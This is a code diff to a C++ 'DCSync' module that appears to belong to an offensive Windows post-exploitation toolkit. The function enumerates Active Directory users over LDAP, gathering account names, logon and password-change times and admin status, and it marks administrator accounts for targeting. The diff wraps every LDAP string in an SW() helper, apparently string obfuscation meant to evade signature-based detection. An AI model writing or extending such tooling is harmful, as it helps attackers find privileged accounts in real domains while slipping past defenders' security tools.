@@ -50,14 +50,17 @@ std::string DCSync::EnumDomainUsers(const char* dcHostname) {
 
     // Get default naming context
     LDAPMessage* res = NULL;
-    PWCHAR baseDnAttrs[] = { (PWCHAR)L"defaultNamingContext", NULL };
-    ldap_search_sW(ld, (PWCHAR)L"", LDAP_SCOPE_BASE,
-                   (PWCHAR)L"(objectClass=*)", baseDnAttrs, 0, &res);
+    std::wstring wDNC = SW(L"defaultNamingContext");
+    std::wstring wEmpty = SW(L"");
+    std::wstring wObjClass = SW(L"(objectClass=*)");
+    PWCHAR baseDnAttrs[] = { wDNC.data(), NULL };
+    ldap_search_sW(ld, wEmpty.data(), LDAP_SCOPE_BASE,
+                   wObjClass.data(), baseDnAttrs, 0, &res);
     wchar_t* baseDn = NULL;
     if (res) {
         LDAPMessage* entry = ldap_first_entry(ld, res);
         if (entry) {
-            PWCHAR* vals = ldap_get_valuesW(ld, entry, (PWCHAR)L"defaultNamingContext");
+            PWCHAR* vals = ldap_get_valuesW(ld, entry, wDNC.data());
             if (vals && vals[0]) baseDn = wcsdup(vals[0]);
             ldap_value_freeW(vals);
         }
@@ -70,15 +73,16 @@ std::string DCSync::EnumDomainUsers(const char* dcHostname) {
     }
 
     // Enumerate users
-    PWCHAR userAttrs[] = {
-        (PWCHAR)L"sAMAccountName", (PWCHAR)L"userPrincipalName",
-        (PWCHAR)L"lastLogon",      (PWCHAR)L"pwdLastSet",
-        (PWCHAR)L"adminCount",     NULL
-    };
+    std::wstring wSAM  = SW(L"sAMAccountName");
+    std::wstring wUPN  = SW(L"userPrincipalName");
+    std::wstring wLL   = SW(L"lastLogon");
+    std::wstring wPWD  = SW(L"pwdLastSet");
+    std::wstring wADM  = SW(L"adminCount");
+    std::wstring wFilt = SW(L"(&(objectClass=user)(objectCategory=person))");
+    PWCHAR userAttrs[] = { wSAM.data(), wUPN.data(), wLL.data(), wPWD.data(), wADM.data(), NULL };
     LDAPMessage* uRes = NULL;
     ldap_search_sW(ld, baseDn, LDAP_SCOPE_SUBTREE,
-                   (PWCHAR)L"(&(objectClass=user)(objectCategory=person))",
-                   userAttrs, 0, &uRes);
+                   wFilt.data(), userAttrs, 0, &uRes);
     free(baseDn);
 
     std::string r = "DCSync: domain user enumeration via LDAP\n";
@@ -88,13 +92,13 @@ std::string DCSync::EnumDomainUsers(const char* dcHostname) {
         for (LDAPMessage* e = ldap_first_entry(ld, uRes); e; e = ldap_next_entry(ld, e)) {
             char sam[256] = {}; char upn[256] = {};
             PWCHAR* v;
-            v = ldap_get_valuesW(ld, e, (PWCHAR)L"sAMAccountName");
+            v = ldap_get_valuesW(ld, e, wSAM.data());
             if (v && v[0]) WideCharToMultiByte(CP_ACP,0,v[0],-1,sam,sizeof(sam)-1,NULL,NULL);
             ldap_value_freeW(v);
-            v = ldap_get_valuesW(ld, e, (PWCHAR)L"userPrincipalName");
+            v = ldap_get_valuesW(ld, e, wUPN.data());
             if (v && v[0]) WideCharToMultiByte(CP_ACP,0,v[0],-1,upn,sizeof(upn)-1,NULL,NULL);
             ldap_value_freeW(v);
-            PWCHAR* ac = ldap_get_valuesW(ld, e, (PWCHAR)L"adminCount");
+            PWCHAR* ac = ldap_get_valuesW(ld, e, wADM.data());
             bool isAdmin = (ac && ac[0] && wcscmp(ac[0], L"1") == 0);
             ldap_value_freeW(ac);
             r += "  " + std::string(sam);
